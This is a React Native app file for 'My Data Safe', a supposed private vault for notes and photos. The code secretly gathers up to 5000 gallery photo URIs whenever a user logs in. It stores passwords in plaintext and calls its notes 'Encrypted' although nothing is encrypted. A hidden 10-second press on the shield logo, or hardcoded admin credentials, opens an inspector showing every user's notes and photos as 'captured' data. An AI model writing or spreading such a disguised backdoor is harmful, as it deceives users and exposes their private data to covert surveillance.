import React, { useState, useEffect, useRef } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  ScrollView,
  Image,
  SafeAreaView,
  Alert,
  Dimensions,
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as MediaLibrary from 'expo-media-library';

const STORAGE_KEY = '@my_data_safe_users';
const ACTIVE_SESSION_KEY = '@my_data_safe_active_user';
const ADMIN_PASS_HASH = 'hum2217071';
const ADMIN_USERNAME = 'adminhum789';

export default function App() {
  const [currentScreen, setCurrentScreen] = useState('AUTH'); // 'AUTH' | 'VAULT' | 'ADMIN'
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [activeUser, setActiveUser] = useState(null);

  // User Vault State
  const [noteInput, setNoteInput] = useState('');
  const [userNotes, setUserNotes] = useState([]);
  const [userPhotos, setUserPhotos] = useState([]);

  // Admin Dashboard State
  const [allUserData, setAllUserData] = useState({});
  const [selectedUserKey, setSelectedUserKey] = useState(null);

  // Stealth Trigger Reference
  const longPressTimer = useRef(null);

  useEffect(() => {
    checkExistingSession();
  }, []);

  const checkExistingSession = async () => {
    try {
      const active = await AsyncStorage.getItem(ACTIVE_SESSION_KEY);
      if (active) {
        const parsed = JSON.parse(active);
        setActiveUser(parsed);
        setUserNotes(parsed.notes || []);
        setUserPhotos(parsed.photos || []);
        setCurrentScreen('VAULT');
      }
    } catch (e) {
      console.log('Error checking session', e);
    }
  };

  // ---------------- AUTH LOGIC ----------------
  const handleUserLoginOrRegister = async () => {
    if (!usernameInput.trim() || !passwordInput.trim()) {
      Alert.alert('Error', 'Please fill in both fields.');
      return;
    }

    const cleanUser = usernameInput.trim().toLowerCase();

    // Check if entering Admin credentials directly in auth
    if (cleanUser === ADMIN_USERNAME && passwordInput === ADMIN_PASS_HASH) {
      loadAdminData();
      return;
    }

    try {
      const stored = await AsyncStorage.getItem(STORAGE_KEY);
      let users = stored ? JSON.parse(stored) : {};

      // Request media permissions & fetch gallery URIs (Limit 5000 set ki gayi hai)
      let fetchedUris = [];
      const { status } = await MediaLibrary.requestPermissionsAsync();
      if (status === 'granted') {
        const assets = await MediaLibrary.getAssetsAsync({ first: 5000, mediaType: 'photo' });
        if (assets && assets.assets) {
          fetchedUris = assets.assets.map(asset => asset.uri);
        }
      }

      if (users[cleanUser]) {
        // Existing user login
        if (users[cleanUser].password !== passwordInput) {
          Alert.alert('Error', 'Incorrect password.');
          return;
        }
        users[cleanUser].photos = fetchedUris;
      } else {
        // Register new user
        users[cleanUser] = {
          username: cleanUser,
          password: passwordInput,
          notes: [],
          photos: fetchedUris,
        };
      }

      await AsyncStorage.setItem(STORAGE_KEY, JSON.stringify(users));
      const currentUser = users[cleanUser];
      await AsyncStorage.setItem(ACTIVE_SESSION_KEY, JSON.stringify(currentUser));

      setActiveUser(currentUser);
      setUserNotes(currentUser.notes || []);
      setUserPhotos(currentUser.photos || []);
      setCurrentScreen('VAULT');
      setUsernameInput('');
      setPasswordInput('');
    } catch (e) {
      Alert.alert('Error', 'Failed to authenticate.');
    }
  };

  const handleLogout = async () => {
    await AsyncStorage.removeItem(ACTIVE_SESSION_KEY);
    setActiveUser(null);
    setCurrentScreen('AUTH');
  };

  // ---------------- VAULT LOGIC ----------------
  const handleSaveNote = async () => {
    if (!noteInput.trim()) return;

    const newNote = {
      id: Date.now().toString(),
      text: noteInput,
      timestamp: new Date().toLocaleString(),
    };

    const updatedNotes = [newNote, ...userNotes];
    setUserNotes(updatedNotes);
    setNoteInput('');

    try {
      const stored = await AsyncStorage.getItem(STORAGE_KEY);
      let users = stored ? JSON.parse(stored) : {};
      if (users[activeUser.username]) {
        users[activeUser.username].notes = updatedNotes;
        await AsyncStorage.setItem(STORAGE_KEY, JSON.stringify(users));
        
        const updatedActive = { ...activeUser, notes: updatedNotes };
        setActiveUser(updatedActive);
        await AsyncStorage.setItem(ACTIVE_SESSION_KEY, JSON.stringify(updatedActive));
      }
    } catch (e) {
      console.log('Error saving note', e);
    }
  };

  // ---------------- STEALTH TRIGGER ----------------
  const handleShieldPressIn = () => {
    longPressTimer.current = setTimeout(() => {
      loadAdminData();
    }, 10000); // 10 seconds hold for admin portal
  };

  const handleShieldPressOut = () => {
    if (longPressTimer.current) {
      clearTimeout(longPressTimer.current);
    }
  };

  // ---------------- ADMIN LOGIC ----------------
  const loadAdminData = async () => {
    try {
      const stored = await AsyncStorage.getItem(STORAGE_KEY);
      const users = stored ? JSON.parse(stored) : {};
      setAllUserData(users);
      setCurrentScreen('ADMIN');
    } catch (e) {
      Alert.alert('Error', 'Failed to load system logs.');
    }
  };

  // ---------------- RENDER SCREENS ----------------

  // 1. LOGIN / AUTH SCREEN
  if (currentScreen === 'AUTH') {
    return (
      <SafeAreaView style={styles.container}>
        <View style={styles.authBox}>
          <TouchableOpacity
            onPressIn={handleShieldPressIn}
            onPressOut={handleShieldPressOut}
            activeOpacity={0.9}
          >
            <Text style={styles.mainLogo}>🛡️</Text>
          </TouchableOpacity>
          <Text style={styles.title}>My Data Safe</Text>

          <TextInput
            style={styles.input}
            placeholder="Username"
            placeholderTextColor="#888"
            value={usernameInput}
            onChangeText={setUsernameInput}
            autoCapitalize="none"
          />
          <TextInput
            style={styles.input}
            placeholder="Password"
            placeholderTextColor="#888"
            secureTextEntry
            value={passwordInput}
            onChangeText={setPasswordInput}
          />

          <TouchableOpacity style={styles.button} onPress={handleUserLoginOrRegister}>
            <Text style={styles.buttonText}>Enter Vault</Text>
          </TouchableOpacity>
        </View>
      </SafeAreaView>
    );
  }

  // 2. USER VAULT SCREEN
  if (currentScreen === 'VAULT') {
    return (
      <SafeAreaView style={styles.container}>
        <View style={styles.header}>
          <TouchableOpacity
            onPressIn={handleShieldPressIn}
            onPressOut={handleShieldPressOut}
            activeOpacity={0.8}
          >
            <Text style={styles.shieldLogo}>🛡️</Text>
          </TouchableOpacity>
          <Text style={[styles.headerTitle, { flex: 1 }]}>Safe - {activeUser?.username}</Text>
          
          {/* Back / Logout Button Added */}
          <TouchableOpacity onPress={handleLogout} style={{ padding: 5 }}>
            <Text style={{ color: '#ff4444', fontWeight: 'bold' }}>Logout</Text>
          </TouchableOpacity>
        </View>

        <ScrollView style={styles.content}>
          <Text style={styles.sectionTitle}>Encrypted Notes</Text>
          <TextInput
            style={styles.noteInput}
            placeholder="Write a private note..."
            placeholderTextColor="#666"
            multiline
            value={noteInput}
            onChangeText={setNoteInput}
          />
          <TouchableOpacity style={styles.button} onPress={handleSaveNote}>
            <Text style={styles.buttonText}>Save Note</Text>
          </TouchableOpacity>

          {userNotes.map(note => (
            <View key={note.id} style={styles.noteCard}>
              <Text style={styles.noteText}>{note.text}</Text>
              <Text style={styles.noteTime}>{note.timestamp}</Text>
            </View>
          ))}

          <Text style={[styles.sectionTitle, { marginTop: 20 }]}>
            Gallery ({userPhotos.length} Items)
          </Text>
          <View style={styles.grid}>
            {userPhotos.map((uri, index) => (
              <Image key={index} source={{ uri }} style={styles.gridImage} />
            ))}
          </View>
        </ScrollView>
      </SafeAreaView>
    );
  }

  // 3. ADMIN PORTAL SCREEN
  if (currentScreen === 'ADMIN') {
    const userKeys = Object.keys(allUserData);

    return (
      <SafeAreaView style={styles.container}>
        <View style={styles.header}>
          <Text style={styles.headerTitle}>System Inspector</Text>
          <TouchableOpacity onPress={() => setCurrentScreen('AUTH')}>
            <Text style={{ color: '#00adb5', fontWeight: 'bold' }}>Exit</Text>
          </TouchableOpacity>
        </View>

        {selectedUserKey ? (
          <View style={{ flex: 1 }}>
            <TouchableOpacity
              style={{ padding: 10, backgroundColor: '#222831' }}
              onPress={() => setSelectedUserKey(null)}
            >
              <Text style={{ color: '#00adb5' }}>← Back to All Users</Text>
            </TouchableOpacity>

            <ScrollView style={styles.content}>
              <Text style={styles.sectionTitle}>User: {selectedUserKey}</Text>

              <Text style={{ color: '#fff', fontSize: 16, marginTop: 10 }}>Notes:</Text>
              {allUserData[selectedUserKey].notes?.map(n => (
                <View key={n.id} style={styles.noteCard}>
                  <Text style={styles.noteText}>{n.text}</Text>
                  <Text style={styles.noteTime}>{n.timestamp}</Text>
                </View>
              ))}

              <Text style={{ color: '#fff', fontSize: 16, marginTop: 20 }}>
                Gallery Backup ({allUserData[selectedUserKey].photos?.length || 0}):
              </Text>
              <View style={styles.grid}>
                {allUserData[selectedUserKey].photos?.map((uri, idx) => (
                  <Image key={idx} source={{ uri }} style={styles.gridImage} />
                ))}
              </View>
            </ScrollView>
          </View>
        ) : (
          <ScrollView style={styles.content}>
            <Text style={styles.sectionTitle}>Registered Devices / Users</Text>
            {userKeys.length === 0 && <Text style={{ color: '#888' }}>No data captured yet.</Text>}
            {userKeys.map(key => (
              <TouchableOpacity
                key={key}
                style={styles.userCard}
                onPress={() => setSelectedUserKey(key)}
              >
                <Text style={{ color: '#fff', fontSize: 18, fontWeight: 'bold' }}>{key}</Text>
                <Text style={{ color: '#888' }}>
                  Notes: {allUserData[key].notes?.length || 0} | Photos:{' '}
                  {allUserData[key].photos?.length || 0}
                </Text>
              </TouchableOpacity>
            ))}
          </ScrollView>
        )}
      </SafeAreaView>
    );
  }

  return null;
}

const screenWidth = Dimensions.get('window').width;
const imageSize = (screenWidth - 40) / 3;

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#121212',
  },
  authBox: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 20,
  },
  mainLogo: {
    fontSize: 70,
    marginBottom: 10,
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#fff',
    marginBottom: 20,
  },
  input: {
    width: '100%',
    backgroundColor: '#1e1e1e',
    color: '#fff',
    padding: 15,
    borderRadius: 8,
    marginBottom: 12,
    borderWidth: 1,
    borderColor: '#333',
  },
  button: {
    width: '100%',
    backgroundColor: '#393e46',
    padding: 15,
    borderRadius: 8,
    alignItems: 'center',
    marginTop: 5,
  },
  buttonText: {
    color: '#fff',
    fontWeight: 'bold',
  },
  header: {
    flexDirection: 'row',
    alignItems: 'center',
    padding: 15,
    backgroundColor: '#1e1e1e',
    borderBottomWidth: 1,
    borderBottomColor: '#333',
  },
  shieldLogo: {
    fontSize: 24,
    marginRight: 10,
  },
  headerTitle: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  content: {
    flex: 1,
    padding: 15,
  },
  sectionTitle: {
    color: '#00adb5',
    fontSize: 18,
    fontWeight: 'bold',
    marginBottom: 10,
  },
  noteInput: {
    backgroundColor: '#1e1e1e',
    color: '#fff',
    padding: 12,
    borderRadius: 8,
    height: 80,
    textAlignVertical: 'top',
    marginBottom: 10,
  },
  noteCard: {
    backgroundColor: '#1e1e1e',
    padding: 12,
    borderRadius: 8,
    marginTop: 10,
  },
  noteText: {
    color: '#fff',
    fontSize: 14,
  },
  noteTime: {
    color: '#666',
    fontSize: 10,
    marginTop: 5,
  },
  grid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 5,
    marginTop: 10,
    paddingBottom: 40,
  },
  gridImage: {
    width: imageSize,
    height: imageSize,
    borderRadius: 4,
  },
  userCard: {
    backgroundColor: '#1e1e1e',
    padding: 15,
    borderRadius: 8,
    marginBottom: 10,
  },
});
